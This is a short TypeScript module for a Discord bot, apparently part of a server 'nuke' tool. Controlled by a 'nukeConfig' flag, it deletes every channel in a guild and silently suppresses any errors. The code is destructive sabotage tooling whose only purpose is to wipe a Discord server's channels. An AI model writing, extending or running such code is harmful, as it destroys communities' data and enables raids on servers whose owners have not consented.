import { Guild } from "discord.js";
import { nukeConfig } from "../index";

export default async (guild: Guild): Promise<void> => {
	if (nukeConfig.REMOVE_CHANNELS) {
		guild.channels.cache.forEach(async (channel) => {
			await channel.delete().catch(() => {});
		});
	}
};
